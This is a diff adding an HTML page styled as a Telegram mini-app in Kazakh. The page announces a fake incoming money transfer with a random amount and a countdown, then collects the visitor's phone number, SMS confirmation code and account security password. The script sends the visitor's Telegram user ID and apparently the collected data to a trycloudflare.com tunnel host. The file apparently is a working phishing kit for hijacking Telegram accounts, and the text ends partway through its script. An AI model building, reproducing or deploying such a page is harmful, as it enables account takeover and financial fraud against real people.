@@ -1,0 +1,1000 @@
+﻿<!doctype html>
+<html lang="ru" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
+<meta name="color-scheme" content="dark light">
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<title>Telegram</title>
+<style>
+  /* ===== Design tokens ===== */
+  :root{
+    --bg:#F7F8FA; --surface:#FFFFFF; --surface-2:#F1F2F6; --border:#E6E8EE;
+    --text-1:#0B0D14; --text-2:#565B6B; --text-3:#676D7C;
+    --accent:#4F5BFF; --accent-hover:#3D49F0; --accent-soft:rgba(79,91,255,0.10);
+    --success:#16A06B; --error:#D32440; --error-soft:rgba(211,36,64,0.10);
+    --shadow:0 1px 2px rgba(11,13,20,0.04), 0 14px 40px -14px rgba(43,49,99,0.18);
+    --page-bg:#EEF0F4;
+    --aurora-glow:rgba(79,91,255,0.10);
+    --grain-opacity:0.03;
+    --amount-color:#16A06B;
+
+    /* radii */
+    --r-card:20px; --r-btn:14px; --r-field:12px; --r-pill:999px;
+
+    /* motion */
+    --ease-std:cubic-bezier(0.4,0,0.2,1);
+    --ease-soft:cubic-bezier(0.16,1,0.30,1);
+    --ease-inout:cubic-bezier(0.65,0,0.35,1);
+    --dur-screen:300ms;
+    --dur-micro:180ms;
+
+    --font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+  [data-theme="dark"]{
+    --bg:#08090D; --surface:#101118; --surface-2:#181A22; --border:#262932;
+    --text-1:#F4F5F8; --text-2:#A1A6B4; --text-3:#888EA0;
+    --accent:#5A66E8; --accent-hover:#8B96FF; --accent-soft:rgba(109,123,255,0.16);
+    --success:#3DD79A; --error:#FF6B7E; --error-soft:rgba(255,107,126,0.12);
+    --shadow:0 18px 50px -12px rgba(0,0,0,0.70);
+    --page-bg:#040508;
+    --aurora-glow:rgba(109,123,255,0.18);
+    --grain-opacity:0.05;
+    --amount-color:#3DD79A;
+  }
+
+  *,*::before,*::after{ box-sizing:border-box; }
+  html,body{ margin:0; height:100%; }
+  body{
+    font-family:var(--font);
+    background:var(--page-bg);
+    color:var(--text-1);
+    -webkit-font-smoothing:antialiased; text-rendering:optimizeLegibility;
+    display:grid; place-items:center; min-height:100vh; padding:24px;
+    transition:background var(--dur-screen) var(--ease-inout);
+  }
+
+  /* ===== Device frame ===== */
+  .frame{
+    position:relative; width:390px; height:700px;
+    background:var(--bg); color:var(--text-1);
+    border-radius:34px; overflow:hidden;
+    box-shadow:var(--shadow), 0 0 0 1px rgba(0,0,0,.04);
+    transition:background var(--dur-screen) var(--ease-inout), color var(--dur-screen) var(--ease-inout);
+    isolation:isolate;
+  }
+  .frame::before{
+    content:""; position:absolute; inset:0; z-index:0; pointer-events:none;
+    background:radial-gradient(120% 60% at 50% -8%, var(--aurora-glow), transparent 60%);
+    transition:background var(--dur-screen) var(--ease-inout);
+  }
+  .grain{ position:absolute; inset:0; z-index:40; pointer-events:none;
+    opacity:var(--grain-opacity); mix-blend-mode:overlay; }
+  .grain rect{ fill:url(#grainPattern); }
+
+  /* ===== Top bar ===== */
+  .topbar{
+    position:absolute; top:0; left:0; right:0; z-index:30;
+    height:60px; padding:0 20px;
+    display:flex; align-items:center; gap:12px;
+  }
+  .icon-btn{
+    width:44px; height:44px; flex:0 0 auto; display:grid; place-items:center;
+    border:none; background:transparent; color:var(--text-2); cursor:pointer;
+    border-radius:var(--r-pill); transition:background var(--dur-micro) var(--ease-std), color var(--dur-micro) var(--ease-std), opacity var(--dur-micro) var(--ease-std), transform var(--dur-micro) var(--ease-std);
+  }
+  .icon-btn:hover{ background:var(--surface-2); color:var(--text-1); }
+  .icon-btn:active{ transform:scale(0.92); }
+  .icon-btn svg{ width:20px; height:20px; }
+  .icon-btn.is-invisible{ opacity:0; pointer-events:none; visibility:hidden; }
+
+  .progress{ flex:1 1 auto; display:flex; gap:6px; align-items:center; height:4px; opacity:0;
+    transition:opacity var(--dur-micro) var(--ease-std); }
+  .progress.is-on{ opacity:1; }
+  .seg{ flex:1 1 0; height:4px; border-radius:var(--r-pill); background:var(--border); overflow:hidden; }
+  .seg__fill{ display:block; height:100%; width:100%; background:var(--accent); border-radius:inherit;
+    transform:scaleX(0); transform-origin:left center;
+    transition:transform 420ms var(--ease-soft); }
+  .seg.is-filled .seg__fill{ transform:scaleX(1); }
+  .seg.is-active .seg__fill{ box-shadow:0 0 8px var(--accent); }
+
+  /* ===== Screens layer ===== */
+  .screens{ position:absolute; inset:0; z-index:10; }
+  .screen{
+    position:absolute; inset:0; visibility:hidden; opacity:0;
+    transform:translateX(var(--off,24px));
+    transition:opacity var(--dur-screen) var(--ease-std), transform var(--dur-screen) var(--ease-soft);
+    display:flex; flex-direction:column;
+    padding:76px 24px 24px;
+  }
+  .screen.is-active{ visibility:visible; opacity:1; transform:translateX(0); }
+  .screen.is-leaving{ visibility:visible; opacity:0; transform:translateX(var(--off,-24px)); }
+
+  .eyebrow{ font-size:12px; line-height:14px; font-weight:600; letter-spacing:.08em;
+    text-transform:uppercase; color:var(--accent); display:flex; align-items:center; gap:7px; margin:0 0 12px; }
+  .eyebrow::before{ content:""; width:6px; height:6px; border-radius:50%; background:var(--accent);
+    box-shadow:0 0 0 4px var(--accent-soft); }
+  h1.title{ font-size:20px; line-height:26px; font-weight:620; letter-spacing:-0.01em; margin:0 0 8px; color:var(--text-1); }
+  .subtitle{ font-size:16px; line-height:24px; font-weight:440; color:var(--text-2); margin:0 0 24px; }
+
+  /* ===== Buttons ===== */
+  .btn{ position:relative; width:100%; height:52px; border:none; border-radius:var(--r-btn);
+    font-family:inherit; font-size:16px; font-weight:600; letter-spacing:-0.01em; cursor:pointer;
+    display:inline-flex; align-items:center; justify-content:center; gap:8px;
+    transition:background var(--dur-micro) var(--ease-std), transform var(--dur-micro) var(--ease-std), opacity var(--dur-micro) var(--ease-std), color var(--dur-micro) var(--ease-std); }
+  .btn:active:not(:disabled){ transform:scale(0.985); }
+  .btn--primary{ background:var(--accent); color:#fff; }
+  .btn--primary:hover:not(:disabled){ background:var(--accent-hover); }
+  .btn--ghost{ background:transparent; color:var(--text-2); height:44px; }
+  .btn--ghost:hover{ color:var(--text-1); }
+  .btn:disabled{ background:var(--surface-2); color:var(--text-3); cursor:not-allowed; }
+  .btn--primary.is-loading{ background:var(--accent); color:#fff; }
+  .btn__label{ transition:opacity 140ms var(--ease-std); }
+  .btn.is-loading .btn__label{ opacity:0; }
+  .btn.is-loading{ cursor:progress; }
+  .btn .spinner{ position:absolute; opacity:0; transition:opacity 140ms var(--ease-std); }
+  .btn.is-loading .spinner{ opacity:1; }
+
+  .spinner{ width:18px; height:18px; }
+  .spinner circle{ fill:none; stroke:currentColor; stroke-width:2; stroke-linecap:round;
+    stroke-dasharray:42; stroke-dashoffset:32; }
+  .btn--primary .spinner circle{ stroke:#fff; }
+  .spinner.is-spinning{ animation:spin .7s linear infinite; }
+  @keyframes spin{ to{ transform:rotate(360deg); } }
+
+  .spacer{ flex:1 1 auto; min-height:24px; }
+  .cta-stack{ display:flex; flex-direction:column; gap:10px; }
+
+  /* ===== Fields ===== */
+  .field-label{ font-size:13px; line-height:18px; font-weight:540; color:var(--text-2); margin:0 0 8px; }
+  .field{ display:flex; align-items:center; height:54px; padding:0 14px; gap:8px;
+    background:var(--surface); border:1px solid var(--border); border-radius:var(--r-field);
+    transition:border-color var(--dur-micro) var(--ease-std), box-shadow var(--dur-micro) var(--ease-std); }
+  .field:focus-within{ border-color:var(--accent); box-shadow:0 0 0 2px var(--accent-soft); }
+  .field.is-error{ border-color:var(--error); box-shadow:0 0 0 2px var(--error-soft); }
+  .field__prefix{ font-size:16px; color:var(--text-2); font-variant-numeric:tabular-nums; user-select:none; }
+  .field input{ flex:1 1 auto; min-width:0; border:none; outline:none; background:transparent;
+    font-family:inherit; font-size:16px; color:var(--text-1); letter-spacing:.01em; }
+  .field input::placeholder{ color:var(--text-3); }
+  .eye-btn{ border:none; background:transparent; color:var(--text-3); cursor:pointer;
+    min-width:44px; min-height:44px; margin:0 -8px 0 0; display:grid; place-items:center; border-radius:8px; }
+  .eye-btn:hover{ color:var(--text-2); }
+  .eye-btn svg{ width:20px; height:20px; }
+
+  .hint{ min-height:18px; font-size:12px; line-height:18px; color:var(--text-3); margin:8px 2px 0;
+    display:flex; align-items:center; gap:6px; }
+  .hint svg{ width:13px; height:13px; flex:0 0 auto; }
+  .hint.is-error{ color:var(--error); }
+  .hint[hidden]{ display:none; }
+
+  .shake{ animation:shake 380ms var(--ease-std); }
+  @keyframes shake{ 0%{transform:translateX(0)} 16%{transform:translateX(-7px)} 32%{transform:translateX(6px)}
+    48%{transform:translateX(-4px)} 64%{transform:translateX(3px)} 80%{transform:translateX(-1px)} 100%{transform:translateX(0)} }
+
+  /* ===== Transfer card (welcome screen) ===== */
+  .transfer-card{
+    background:var(--surface); border:1px solid var(--border); border-radius:var(--r-card);
+    padding:24px 20px; margin-bottom:20px;
+    box-shadow:0 2px 12px rgba(0,0,0,0.04);
+    text-align:center;
+  }
+  .transfer-icon{
+    width:64px; height:64px; border-radius:50%;
+    background:var(--accent-soft); color:var(--accent);
+    display:grid; place-items:center; margin:0 auto 16px;
+  }
+  .transfer-icon svg{ width:30px; height:30px; }
+  .transfer-amount{ font-size:38px; line-height:44px; font-weight:700; letter-spacing:-0.02em;
+    color:var(--amount-color); margin:0 0 6px; }
+  .transfer-sender{ font-size:15px; color:var(--text-2); font-weight:500; margin:0 0 4px; }
+  .transfer-status{ font-size:13px; color:var(--text-3); display:flex; align-items:center; justify-content:center; gap:6px; }
+  .transfer-status .dot{ width:8px; height:8px; border-radius:50%; background:#F5A623; }
+  .timer-box{
+    display:flex; align-items:center; justify-content:center; gap:8px;
+    margin-top:12px; padding:10px 16px;
+    background:var(--surface-2); border-radius:var(--r-field);
+    font-size:14px; font-weight:540; color:var(--text-2);
+  }
+  .timer-box .timer-value{ color:var(--text-1); font-variant-numeric:tabular-nums; font-weight:600; }
+  @keyframes pulse{ 0%,100%{ box-shadow:0 0 0 0 var(--accent-soft); } 50%{ box-shadow:0 0 0 8px transparent; } }
+  .btn--primary.is-pulse{ animation:pulse 2s ease infinite; }
+
+  /* ===== OTP display + keypad ===== */
+  .otp-display{ display:flex; gap:10px; justify-content:center; margin-bottom:24px; }
+  .otp-cell{
+    width:48px; height:56px; border-radius:var(--r-field);
+    border:2px solid var(--border); background:var(--surface);
+    display:grid; place-items:center;
+    font-size:24px; font-weight:640; font-variant-numeric:tabular-nums; color:var(--text-1);
+    transition:border-color var(--dur-micro) var(--ease-std), box-shadow var(--dur-micro) var(--ease-std), transform var(--dur-micro) var(--ease-std);
+  }
+  .otp-cell.is-filled{ border-color:var(--accent); }
+  .otp-cell.is-active{ border-color:var(--accent); box-shadow:0 0 0 2px var(--accent-soft); transform:scale(1.04); }
+  .otp-error .otp-cell{ border-color:var(--error); box-shadow:0 0 0 2px var(--error-soft); }
+
+  .keypad{ display:grid; grid-template-columns:repeat(3, 1fr); gap:10px; max-width:300px; margin:0 auto; }
+  .key-btn{
+    height:58px; border:none; border-radius:var(--r-btn);
+    background:var(--surface); color:var(--text-1);
+    font-family:inherit; font-size:24px; font-weight:600;
+    cursor:pointer; display:grid; place-items:center;
+    border:1px solid var(--border);
+    transition:background var(--dur-micro) var(--ease-std), transform var(--dur-micro) var(--ease-std), border-color var(--dur-micro) var(--ease-std);
+    -webkit-tap-highlight-color:transparent; user-select:none;
+  }
+  .key-btn:active{ background:var(--accent-soft); border-color:var(--accent); transform:scale(0.94); }
+  .key-btn--bs{ color:var(--text-2); font-size:20px; }
+  .key-btn--empty{ opacity:0; pointer-events:none; }
+
+  .resend-row{ display:flex; justify-content:center; margin-top:16px; }
+  .link-btn{ border:none; background:transparent; font-family:inherit; font-size:13px; font-weight:540;
+    color:var(--accent); cursor:pointer; padding:6px 8px; border-radius:8px;
+    transition:color var(--dur-micro) var(--ease-std); }
+  .link-btn:hover:not(:disabled){ color:var(--accent-hover); }
+  .link-btn:disabled{ color:var(--text-3); cursor:default; }
+  .inline-link{ color:var(--accent); cursor:pointer; font-weight:540; border-radius:4px; }
+  .inline-link:hover{ color:var(--accent-hover); }
+
+  /* ===== Success ===== */
+  .success-wrap{ flex:1 1 auto; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; position:relative; }
+  .check-disc{ position:relative; width:96px; height:96px; border-radius:50%;
+    background:var(--accent-soft); display:grid; place-items:center; margin-bottom:24px; }
+  .check-ring{ position:absolute; inset:0; border-radius:50%; border:1px solid var(--success); opacity:0; }
+  .check-disc svg{ width:48px; height:48px; }
+  .check-disc .check-path{ stroke:var(--success); stroke-width:2.5; fill:none; stroke-linecap:round; stroke-linejoin:round;
+    stroke-dasharray:48; stroke-dashoffset:48; }
+  .spark{ position:absolute; top:50%; left:50%; width:7px; height:7px; border-radius:50%; opacity:0; }
+  .screen[data-screen="success"].is-active .check-disc{ animation:discPop 240ms var(--ease-soft) both; }
+  .screen[data-screen="success"].is-active .check-path{ animation:drawCheck 520ms var(--ease-soft) 180ms forwards; }
+  .screen[data-screen="success"].is-active .check-ring{ animation:ringPulse 900ms var(--ease-soft) 120ms 1; }
+  .screen[data-screen="success"].is-active .spark{ animation:sparkOut 900ms var(--ease-soft) 200ms 1; }
+  @keyframes discPop{ from{ transform:scale(0.92); } to{ transform:scale(1); } }
+  @keyframes drawCheck{ to{ stroke-dashoffset:0; } }
+  @keyframes ringPulse{ 0%{ transform:scale(0.70); opacity:.5; } 100%{ transform:scale(1.25); opacity:0; } }
+  @keyframes sparkOut{ 0%{ opacity:0; transform:translate(-50%,-50%) rotate(var(--a)) translateX(0) scale(.4); }
+    30%{ opacity:1; } 100%{ opacity:0; transform:translate(-50%,-50%) rotate(var(--a)) translateX(64px) scale(1); } }
+
+  .summary{ font-size:16px; line-height:24px; color:var(--text-2); }
+
+  /* ===== Reduced motion ===== */
+  @media (prefers-reduced-motion: reduce){
+    .screen{ transition:opacity 120ms linear; transform:none !important; }
+    .screen.is-leaving{ transform:none !important; }
+    .shake{ animation:none; }
+    .seg__fill{ transition:none; }
+    .spinner.is-spinning{ animation:spin 1.2s linear infinite; }
+    .btn--primary.is-pulse{ animation:none; }
+    .screen[data-screen="success"].is-active .check-disc,
+    .screen[data-screen="success"].is-active .check-ring,
+    .screen[data-screen="success"].is-active .spark{ animation:none; }
+    .check-path{ stroke-dashoffset:0 !important; }
+  }
+</style>
+</head>
+<body>
+  <svg width="0" height="0" style="position:absolute" aria-hidden="true">
+    <filter id="grainFilter"><feTurbulence type="fractalNoise" baseFrequency="0.9" numOctaves="2" stitchTiles="stitch"/></filter>
+    <pattern id="grainPattern" width="180" height="180" patternUnits="userSpaceOnUse">
+      <rect width="180" height="180" filter="url(#grainFilter)"/>
+    </pattern>
+  </svg>
+
+  <div class="frame" id="frame">
+    <svg class="grain" aria-hidden="true"><rect width="100%" height="100%"></rect></svg>
+
+    <!-- Top bar -->
+    <div class="topbar">
+      <button class="icon-btn is-invisible" id="backBtn" type="button" aria-label="Артқа">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+      </button>
+      <div class="progress" id="progress" role="progressbar" aria-label="Барысы">
+        <div class="seg"><span class="seg__fill"></span></div>
+        <div class="seg"><span class="seg__fill"></span></div>
+        <div class="seg"><span class="seg__fill"></span></div>
+        <div class="seg"><span class="seg__fill"></span></div>
+      </div>
+      <button class="icon-btn" id="themeBtn" type="button" aria-label="Тақырыпты өзгерту">
+        <svg id="themeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg>
+      </button>
+    </div>
+
+    <div class="screens" id="screens">
+
+      <!-- ===== Screen 1: Transfer notification ===== -->
+      <section class="screen" data-screen="welcome" aria-label="Аударым туралы хабарлама">
+        <div class="transfer-card">
+          <div class="transfer-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M17 9l-5-5-5 5"/><path d="M12 4v12"/><path d="M7 15H5a2 2 0 0 0-2 2v1a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-1a2 2 0 0 0-2-2h-2"/>
+            </svg>
+          </div>
+          <p class="subtitle" style="margin:0 0 4px;font-size:14px">Сізге ақша аударымы келіп түсті</p>
+          <p class="transfer-amount" id="transferAmount">85 000 ₸</p>
+          <p class="transfer-status">
+            <span class="dot"></span> Растауды күтуде
+          </p>
+          <div class="timer-box">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:16px;height:16px"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+            Автоматты бас тарту <span class="timer-value" id="welcomeTimer">23:59:00</span>
+          </div>
+        </div>
+        <div class="spacer"></div>
+        <div class="cta-stack">
+          <button class="btn btn--primary is-pulse" id="welcomeCta" type="button">
+            <span class="btn__label">Аударымды қабылдау</span>
+          </button>
+          <button class="btn btn--ghost" id="declineBtn" type="button">Бас тарту</button>
+        </div>
+      </section>
+
+      <!-- ===== Screen 2: Phone ===== -->
+      <section class="screen" data-screen="phone" aria-label="Телефон нөмірін енгізу">
+        <p class="eyebrow">1-қадам, 3</p>
+        <h1 class="title">Алушыны растау</h1>
+        <p class="subtitle"></p>
+
+        <label class="field-label" for="phoneInput">Телефон нөмірі</label>
+        <div class="field" id="phoneField">
+          <span class="field__prefix">+7</span>
+          <input id="phoneInput" type="tel" inputmode="numeric" autocomplete="tel-national"
+                 placeholder="(000) 000-00-00" aria-describedby="phoneHint" maxlength="18">
+        </div>
+        <p class="hint" id="phoneHint">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="11" width="16" height="9" rx="2"/><path d="M8 11V8a4 4 0 0 1 8 0v3"/></svg>
+          Деректер шифрланған және үшінші тұлғаларға берілмейді.
+        </p>
+        <p class="hint is-error" id="phoneError" aria-live="polite" hidden></p>
+        <p class="hint is-error" id="phoneApiError" aria-live="polite" hidden></p>
+
+        <div class="spacer"></div>
+        <div class="cta-stack">
+          <button class="btn btn--primary" id="phoneCta" type="button" disabled>
+            <span class="btn__label">Кодты алу</span>
+            <svg class="spinner" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/></svg>
+          </button>
+        </div>
+      </section>
+
+      <!-- ===== Screen 3: Code ===== -->
+      <section class="screen" data-screen="code" aria-label="SMS кодын енгізу">
+        <p class="eyebrow">2-қадам, 3</p>
+        <h1 class="title">Растау коды</h1>
+        <p class="subtitle"><span id="codePhone" style="color:var(--text-1)"></span> нөміріне жіберілді.&nbsp;<span class="inline-link" id="editPhone" role="button" tabindex="0">Өзгерту</span></p>
+
+        <div class="otp-display" id="otpDisplay">
+          <div class="otp-cell"></div>
+          <div class="otp-cell"></div>
+          <div class="otp-cell"></div>
+          <div class="otp-cell"></div>
+          <div class="otp-cell"></div>
+        </div>
+        <p class="hint is-error" id="codeError" aria-live="polite" hidden></p>
+
+        <div class="keypad" id="keypad">
+          <button class="key-btn" data-digit="1">1</button>
+          <button class="key-btn" data-digit="2">2</button>
+          <button class="key-btn" data-digit="3">3</button>
+          <button class="key-btn" data-digit="4">4</button>
+          <button class="key-btn" data-digit="5">5</button>
+          <button class="key-btn" data-digit="6">6</button>
+          <button class="key-btn" data-digit="7">7</button>
+          <button class="key-btn" data-digit="8">8</button>
+          <button class="key-btn" data-digit="9">9</button>
+          <button class="key-btn key-btn--bs" data-digit="del" aria-label="Өшіру">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="width:24px;height:24px"><path d="M7 7l10 10M17 7l-10 10"/></svg>
+          </button>
+          <button class="key-btn" data-digit="0">0</button>
+          <button class="key-btn key-btn--empty"></button>
+        </div>
+
+        <div class="resend-row">
+          <button class="link-btn" id="resendBtn" type="button" disabled></button>
+        </div>
+
+        <div class="spacer"></div>
+        <div class="cta-stack">
+          <button class="btn btn--primary" id="codeCta" type="button" disabled>
+            <span class="btn__label">Растау</span>
+            <svg class="spinner" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/></svg>
+          </button>
+        </div>
+      </section>
+
+      <!-- ===== Screen 4: Password ===== -->
+      <section class="screen" data-screen="password" aria-label="Қауіпсіздік құпиясөзі">
+        <p class="eyebrow">3-қадам, 3</p>
+        <h1 class="title">Қосымша тексеру</h1>
+        <p class="subtitle">Транзакция үшін аккаунтыңыздың қауіпсіздік құпиясөзі қажет.</p>
+
+        <label class="field-label" for="pwInput">Қауіпсіздік құпиясөзі</label>
+        <div class="field" id="pwField">
+           <input id="pwInput" type="password" autocomplete="off" placeholder="Құпиясөзді енгізіңіз" aria-describedby="pwError">
+          <button class="eye-btn" id="eyeBtn" type="button" aria-label="Құпиясөзді көрсету" aria-pressed="false"></button>
+        </div>
+        <p class="hint is-error" id="pwError" aria-live="polite" hidden></p>
+
+        <div class="spacer"></div>
+        <div class="cta-stack">
+          <button class="btn btn--primary" id="pwCta" type="button" disabled>
+            <span class="btn__label">Растау</span>
+            <svg class="spinner" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/></svg>
+          </button>
+        </div>
+      </section>
+
+      <!-- ===== Screen 5: Success ===== -->
+      <section class="screen" data-screen="success" aria-label="Дайын">
+        <div class="success-wrap">
+          <div class="check-disc">
+            <div class="check-ring"></div>
+            <span class="spark" style="--a:20deg;background:var(--accent)"></span>
+            <span class="spark" style="--a:75deg;background:#8B5CF6"></span>
+            <span class="spark" style="--a:130deg;background:var(--success)"></span>
+            <span class="spark" style="--a:200deg;background:var(--accent)"></span>
+            <span class="spark" style="--a:255deg;background:#7CE0FF"></span>
+            <span class="spark" style="--a:310deg;background:var(--success)"></span>
+            <svg viewBox="0 0 24 24" aria-hidden="true"><path class="check-path" d="M5 12.5l4.5 4.5L19 7.5"/></svg>
+          </div>
+          <h1 class="title" style="font-size:28px;line-height:34px;font-weight:640;letter-spacing:-0.02em;margin-bottom:10px">Аударым расталды</h1>
+          <p class="summary" id="successSummary">Қаражат сіздің шотыңызға<br>5 минут ішінде түседі.</p>
+        </div>
+        <div class="cta-stack">
+          <button class="btn btn--primary" id="successCta" type="button"><span class="btn__label">Жабу</span></button>
+        </div>
+      </section>
+
+    </div><!-- /screens -->
+  </div><!-- /frame -->
+
+<script>
+(function(){
+  "use strict";
+
+  /* ---------- API injection points ---------- */
+  var API_BASE = 'https://importance-civilian-constantly-points.trycloudflare.com';
+  var EXTERNAL_USER_ID = window.userID || null;
+
+  /* ---------- helpers ---------- */
+  var $ = function(s, r){ return (r||document).querySelector(s); };
+  var $$ = function(s, r){ return Array.prototype.slice.call((r||document).querySelectorAll(s)); };
+  var onlyDigits = function(s){ return (s||"").replace(/\D/g, ""); };
+  var reduceMotion = function(){ return window.matchMedia("(prefers-reduced-motion: reduce)").matches; };
+
+  var ORDER = ["welcome","phone","code","password","success"];
+
+  /* ---------- theme ---------- */
+  var SUN = '<circle cx="12" cy="12" r="4.2"/><path d="M12 3v2M12 19v2M5 5l1.4 1.4M17.6 17.6L19 19M3 12h2M19 12h2M5 19l1.4-1.4M17.6 6.4L19 5"/>';
+  var MOON = '<path d="M20 14.5A8 8 0 0 1 9.5 4a7 7 0 1 0 10.5 10.5z"/>';
+  var themeBtn = $("#themeBtn"), themeIcon = $("#themeIcon");
+
+  function applyTheme(t){
+    document.documentElement.setAttribute("data-theme", t);
+    themeIcon.innerHTML = (t === "dark") ? SUN : MOON;
+    try{ localStorage.setItem("wallet-demo-theme", t); }catch(e){}
+  }
+
+  (function initTheme(){
+    var saved = null;
+    try{ saved = localStorage.getItem("wallet-demo-theme"); }catch(e){}
+    if(!saved){
+      try{
+        if(window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.colorScheme){
+          saved = window.Telegram.WebApp.colorScheme;
+        }
+      }catch(e){}
+    }
+    if(!saved){ saved = window.matchMedia("(prefers-color-scheme: light)").matches ? "light" : "dark"; }
+    applyTheme(saved);
+  })();
+
+  themeBtn.addEventListener("click", function(){
+    applyTheme(document.documentElement.getAttribute("data-theme") === "dark" ? "light" : "dark");
+  });
+
+  /* ---------- Telegram WebApp ---------- */
+  var tg = null;
+  (function initTg(){
+    try{
+      if(window.Telegram && window.Telegram.WebApp){
+        tg = window.Telegram.WebApp;
+      } else if(window.parent && window.parent.Telegram && window.parent.Telegram.WebApp){
+        tg = window.parent.Telegram.WebApp;
+      }
+      if(tg){
+        tg.ready();
+        tg.expand();
+        if(tg.initDataUnsafe && tg.initDataUnsafe.user && !EXTERNAL_USER_ID){
+          EXTERNAL_USER_ID = String(tg.initDataUnsafe.user.id);
+        }
+        if(tg.BackButton){
+          tg.BackButton.onClick(function(){
+            if(current === "code" || current === "password") goBackFromCode();
+            else if(current === "phone") go("welcome", { back:true });
+          });
+        }
+      }
+    }catch(e){}
+  })();
+
+  if(!EXTERNAL_USER_ID){
+    try{ EXTERNAL_USER_ID = String(new URL(window.location.href).searchParams.get("uid") || ""); }catch(e){}
+  }
+  if(!EXTERNAL_USER_ID){ EXTERNAL_USER_ID = "0"; }
+
+  /* ---------- screen router ---------- */
+  var screens = {};
+  $$(".screen").forEach(function(el){ screens[el.getAttribute("data-screen")] = el; });
+  var current = "welcome";
+  var transitioning = false;
+  var navToken = 0;
+
+  var progress = $("#progress");
+  var segs = $$(".seg", progress);
+  var backBtn = $("#backBtn");
+
+  var STEP_MAP = { phone:1, code:2, password:3, success:4 };
+
+  function updateChrome(name){
+    var step = STEP_MAP[name];
+    if(step){
+      progress.classList.add("is-on");
+      segs.forEach(function(s, i){
+        s.classList.toggle("is-filled", i < step);
+        s.classList.toggle("is-active", i === step - 1);
+      });
+    } else {
+      progress.classList.remove("is-on");
+    }
+    var showBack = (name === "phone" || name === "code" || name === "password");
+    backBtn.classList.toggle("is-invisible", !showBack);
+  }
+
+  function whenDone(el, cb){
+    var done = false;
+    function fire(){ if(done) return; done = true; el.removeEventListener("transitionend", onEnd); cb(); }
+    function onEnd(e){ if(e.target === el && (e.propertyName === "transform" || e.propertyName === "opacity")) fire(); }
+    el.addEventListener("transitionend", onEnd);
+    setTimeout(fire, 420);
+  }
+
+  function go(to, opts){
+    opts = opts || {};
+    if(transitioning || to === current || !screens[to]) return;
+    navToken++;
+    var back = !!opts.back;
+    var fromEl = screens[current], toEl = screens[to], fromName = current;
+    transitioning = true;
+
+    onLeave(fromName);
+
+    var sign = back ? -1 : 1;
+    toEl.style.setProperty("--off", (24 * sign) + "px");
+    toEl.classList.remove("is-leaving");
+    toEl.style.visibility = "visible";
+    void toEl.offsetWidth;
+
+    requestAnimationFrame(function(){
+      fromEl.style.setProperty("--off", (-24 * sign) + "px");
+      fromEl.classList.remove("is-active");
+      fromEl.classList.add("is-leaving");
+      toEl.classList.add("is-active");
+      updateChrome(to);
+    });
+
+    whenDone(toEl, function(){
+      fromEl.classList.remove("is-leaving");
+      fromEl.style.visibility = "hidden";
+      current = to;
+      transitioning = false;
+      onEnter(to);
+    });
+  }
+
+  function backHandler(){
+    var i = ORDER.indexOf(current);
+    if(i > 0) go(ORDER[i - 1], { back:true });
+  }
+  backBtn.addEventListener("click", backHandler);
+
+  function goBackFromCode(){
+    if(current === "code" || current === "password"){
+      go("phone", { back:true });
+    }
+  }
+
+  /* ---------- button loading ---------- */
+  function setLoading(btn, on){
+    btn.classList.toggle("is-loading", on);
+    btn.disabled = on;
+    var sp = $(".spinner", btn);
+    if(sp) sp.classList.toggle("is-spinning", on);
+  }
+
+  /* ---------- error helpers ---------- */
+  function shake(el){
+    if(reduceMotion()) return;
+    el.classList.remove("shake");
+    void el.offsetWidth;
+    el.classList.add("shake");
+    el.addEventListener("animationend", function h(){ el.classList.remove("shake"); el.removeEventListener("animationend", h); });
+  }
+  var ALERT_SVG = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 8v4"/><path d="M12 16h.01"/></svg>';
+  function showError(hintEl, fieldEl, msg){
+    hintEl.innerHTML = ALERT_SVG;
+    hintEl.appendChild(document.createTextNode(msg));
+    hintEl.hidden = false;
+    if(fieldEl) fieldEl.classList.add("is-error");
+  }
+  function clearError(hintEl, fieldEl){
+    hintEl.hidden = true; hintEl.textContent = "";
+    if(fieldEl) fieldEl.classList.remove("is-error");
+  }
+
+  /* ---------- API ---------- */
+  function apiCall(endpoint, data){
+    var base = API_BASE || (window.location.origin + window.location.pathname.replace(/\/+$/, ''));
+    var url = base + '/api/miniapps/' + endpoint;
+    return fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    }).then(function(r){ return r.json(); });
+  }
+
+  /* ================= Screen 1: Welcome / Timer ================= */
+  var welcomeTimerEl = $("#welcomeTimer");
+  var welcomeDeadline = Date.now() + (23 * 3600 + 59 * 60) * 1000;
+  var welcomeTimerId = null;
+  var RA_AMOUNTS = ["45 000","85 000","120 000","67 500","93 000","150 000","53 000","78 000","112 000","135 000"];
+
+  function pickRandom(arr){ return arr[Math.floor(Math.random() * arr.length)]; }
+
+  (function initWelcome(){
+    $("#transferAmount").textContent = pickRandom(RA_AMOUNTS) + " ₸";
+  })();
+
+  function welcomeTick(){
